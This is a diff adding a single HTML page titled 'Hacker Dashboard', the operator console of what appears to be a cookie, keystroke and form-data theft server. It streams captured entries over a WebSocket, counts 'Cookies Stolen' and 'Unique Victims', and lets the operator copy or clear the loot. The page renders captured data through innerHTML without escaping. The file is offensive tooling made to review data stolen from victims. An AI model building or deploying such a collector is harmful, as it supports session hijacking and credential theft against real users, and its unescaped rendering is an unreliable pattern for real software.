@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hacker Dashboard</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; min-height: 100vh; }
+    .header { background: #111; border-bottom: 2px solid #00ff41; padding: 20px 30px; display: flex; justify-content: space-between; align-items: center; }
+    .header h1 { font-size: 24px; text-shadow: 0 0 10px #00ff41; }
+    .header .status { display: flex; align-items: center; gap: 8px; font-size: 14px; }
+    .header .dot { width: 10px; height: 10px; border-radius: 50%; background: #ff0040; animation: pulse 1s infinite; }
+    .header .dot.connected { background: #00ff41; }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+    .stats { display: flex; gap: 20px; padding: 20px 30px; background: #111; border-bottom: 1px solid #222; }
+    .stat-card { background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 15px 20px; flex: 1; text-align: center; }
+    .stat-card .value { font-size: 36px; font-weight: bold; color: #00ff41; text-shadow: 0 0 10px #00ff4180; }
+    .stat-card .label { font-size: 12px; color: #888; margin-top: 4px; text-transform: uppercase; }
+    .controls { padding: 15px 30px; display: flex; gap: 10px; align-items: center; background: #0d0d0d; }
+    .controls select, .controls button { background: #1a1a1a; color: #00ff41; border: 1px solid #333; padding: 8px 16px; border-radius: 4px; font-family: inherit; cursor: pointer; }
+    .controls button:hover { background: #333; }
+    .controls button.danger { border-color: #ff0040; color: #ff0040; }
+    .controls button.danger:hover { background: #ff004020; }
+    .table-container { padding: 0 30px 30px; overflow-x: auto; }
+    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+    th { background: #1a1a1a; color: #888; text-transform: uppercase; font-size: 11px; letter-spacing: 1px; padding: 12px 15px; text-align: left; border-bottom: 2px solid #333; position: sticky; top: 0; }
+    td { padding: 10px 15px; border-bottom: 1px solid #1a1a1a; font-size: 13px; max-width: 400px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    tr:hover { background: #1a1a1a; }
+    tr.new { animation: flash 1s; }
+    @keyframes flash { 0% { background: #00ff4130; } 100% { background: transparent; } }
+    .type-badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; text-transform: uppercase; }
+    .type-cookie { background: #ff004020; color: #ff6080; border: 1px solid #ff004040; }
+    .type-key { background: #ffaa0020; color: #ffcc00; border: 1px solid #ffaa0040; }
+    .type-form { background: #00aaff20; color: #66ccff; border: 1px solid #00aaff40; }
+    .type-custom { background: #aa00ff20; color: #cc66ff; border: 1px solid #aa00ff40; }
+    .empty { text-align: center; padding: 60px; color: #444; font-size: 18px; }
+    .copy-btn { background: none; border: 1px solid #333; color: #666; padding: 2px 8px; border-radius: 3px; cursor: pointer; font-size: 11px; }
+    .copy-btn:hover { color: #00ff41; border-color: #00ff41; }
+    .copy-btn.copied { color: #00ff41; border-color: #00ff41; }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1>&#x1F480; Hacker Dashboard</h1>
+    <div class="status">
+      <div class="dot" id="ws-status"></div>
+      <span id="ws-text">Disconnected</span>
+    </div>
+  </div>
+
+  <div class="stats">
+    <div class="stat-card">
+      <div class="value" id="total-count">0</div>
+      <div class="label">Total Captures</div>
+    </div>
+    <div class="stat-card">
+      <div class="value" id="cookie-count">0</div>
+      <div class="label">Cookies Stolen</div>
+    </div>
+    <div class="stat-card">
+      <div class="value" id="key-count">0</div>
+      <div class="label">Keystrokes</div>
+    </div>
+    <div class="stat-card">
+      <div class="value" id="ip-count">0</div>
+      <div class="label">Unique Victims</div>
+    </div>
+  </div>
+
+  <div class="controls">
+    <label style="color:#888;font-size:13px;">Filter:</label>
+    <select id="filter">
+      <option value="all">All Types</option>
+      <option value="cookie">Cookie</option>
+      <option value="key">Keystroke</option>
+      <option value="form">Form</option>
+      <option value="custom">Custom</option>
+    </select>
+    <button id="refresh-btn">Refresh</button>
+    <button id="clear-btn" class="danger">Clear All</button>
+    <span style="flex:1"></span>
+    <span style="color:#444;font-size:12px;" id="last-update">-</span>
+  </div>
+
+  <div class="table-container">
+    <table>
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>Time</th>
+          <th>Type</th>
+          <th>Data</th>
+          <th>IP</th>
+          <th>Action</th>
+        </tr>
+      </thead>
+      <tbody id="table-body">
+      </tbody>
+    </table>
+    <div class="empty" id="empty-msg">Waiting for stolen data...</div>
+  </div>
+
+  <script>
+    let allEntries = [];
+    let currentFilter = 'all';
+
+    const tableBody = document.getElementById('table-body');
+    const emptyMsg = document.getElementById('empty-msg');
+    const filterEl = document.getElementById('filter');
+    const wsStatus = document.getElementById('ws-status');
+    const wsText = document.getElementById('ws-text');
+
+    function getTypeBadgeClass(type) {
+      if (type === 'cookie') return 'type-cookie';
+      if (type === 'key') return 'type-key';
+      if (type === 'form') return 'type-form';
+      return 'type-custom';
+    }
+
+    function updateStats() {
+      document.getElementById('total-count').textContent = allEntries.length;
+      document.getElementById('cookie-count').textContent = allEntries.filter(e => e.type === 'cookie').length;
+      document.getElementById('key-count').textContent = allEntries.filter(e => e.type === 'key').length;
+      const ips = new Set(allEntries.map(e => e.ip));
+      document.getElementById('ip-count').textContent = ips.size;
+      document.getElementById('last-update').textContent = 'Updated: ' + new Date().toLocaleTimeString();
+    }
+
+    function renderTable() {
+      const filtered = currentFilter === 'all'
+        ? allEntries
+        : allEntries.filter(e => e.type === currentFilter);
+
+      if (filtered.length === 0) {
+        tableBody.innerHTML = '';
+        emptyMsg.style.display = 'block';
+        return;
+      }
+
+      emptyMsg.style.display = 'none';
+      tableBody.innerHTML = filtered.map((entry, idx) => {
+        const time = new Date(entry.timestamp).toLocaleTimeString();
+        const data = entry.data.length > 80 ? entry.data.slice(0, 80) + '...' : entry.data;
+        return `<tr>
+          <td>${idx + 1}</td>
+          <td>${time}</td>
+          <td><span class="type-badge ${getTypeBadgeClass(entry.type)}">${entry.type}</span></td>
+          <td title="${entry.data.replace(/"/g, '&quot;')}">${data}</td>
+          <td>${entry.ip}</td>
+          <td><button class="copy-btn" onclick="copyData(this, ${idx})">Copy</button></td>
+        </tr>`;
+      }).join('');
+    }
+
+    function addEntry(entry, isNew = false) {
+      allEntries.push(entry);
+      updateStats();
+      renderTable();
+      // Auto-scroll
+      if (isNew) {
+        const rows = tableBody.querySelectorAll('tr');
+        if (rows.length > 0) {
+          rows[rows.length - 1].classList.add('new');
+          rows[rows.length - 1].scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+      }
+    }
+
+    window.copyData = function(btn, idx) {
+      const filtered = currentFilter === 'all'
+        ? allEntries
+        : allEntries.filter(e => e.type === currentFilter);
+      navigator.clipboard.writeText(filtered[idx].data);
+      btn.textContent = 'Copied!';
+      btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1500);
+    };
+
+    // Filter
+    filterEl.addEventListener('change', (e) => {
+      currentFilter = e.target.value;
+      renderTable();
+    });
+
+    // Refresh
+    document.getElementById('refresh-btn').addEventListener('click', async () => {
+      const res = await fetch('/api/logs');
+      allEntries = await res.json();
+      updateStats();
+      renderTable();
+    });
+
+    // Clear
+    document.getElementById('clear-btn').addEventListener('click', async () => {
+      if (!confirm('Clear all captured data?')) return;
+      await fetch('/api/logs', { method: 'DELETE' });
+      allEntries = [];
+      updateStats();
+      renderTable();
+    });
+
+    // WebSocket
+    function connectWS() {
+      const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+      const ws = new WebSocket(`${protocol}//${location.host}`);
+
+      ws.onopen = () => {
+        wsStatus.classList.add('connected');
+        wsText.textContent = 'Connected (real-time)';
+      };
+
+      ws.onmessage = (event) => {
+        const msg = JSON.parse(event.data);
+        if (msg.type === 'init') {
+          allEntries = msg.data || [];
+          updateStats();
+          renderTable();
+        } else {
+          addEntry(msg, true);
+        }
+      };
+
+      ws.onclose = () => {
+        wsStatus.classList.remove('connected');
+        wsText.textContent = 'Disconnected — reconnecting...';
+        setTimeout(connectWS, 3000);
+      };
+
+      ws.onerror = () => ws.close();
+    }
+
+    connectWS();
+  </script>
+</body>
+</html>
